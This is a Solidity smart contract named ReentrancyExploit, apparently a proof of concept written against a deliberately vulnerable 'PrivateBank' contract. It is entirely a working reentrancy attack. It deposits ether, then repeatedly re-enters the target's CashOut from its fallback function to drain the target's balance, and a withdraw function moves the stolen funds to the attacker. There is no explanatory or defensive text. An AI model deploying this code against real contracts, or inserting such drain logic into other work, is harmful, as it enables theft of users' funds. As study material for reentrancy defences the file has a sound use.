pragma solidity ^0.4.19;

import "./vulnerable_contract.sol";

contract ReentrancyExploit {
    PrivateBank public target;
    uint public amount = 1 ether;
    
    // Initialize the target contract
    function ReentrancyExploit(address _target) public {
        target = PrivateBank(_target);
    }
    
    // Function to start the attack
    function attack() public payable {
        require(msg.value >= 1 ether, "Need at least 1 ether to attack");
        
        // First deposit into the vulnerable contract
        target.Deposit.value(msg.value)();
        
        // Start the reentrancy attack by calling CashOut
        target.CashOut(msg.value);
    }
    
    // Fallback function where the reentrancy magic happens
    function() public payable {
        // If there's still balance in the target contract, keep withdrawing
        if (address(target).balance >= amount) {
            target.CashOut(amount);
        }
    }
    
    // Function to withdraw the stolen funds to the attacker
    function withdraw() public {
        require(address(this).balance > 0, "No funds to withdraw");
        msg.sender.transfer(address(this).balance);
    }
    
    // Function to check contract's balance
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
    
    // Function to check target contract's balance
    function getTargetBalance() public view returns (uint) {
        return address(target).balance;
    }
}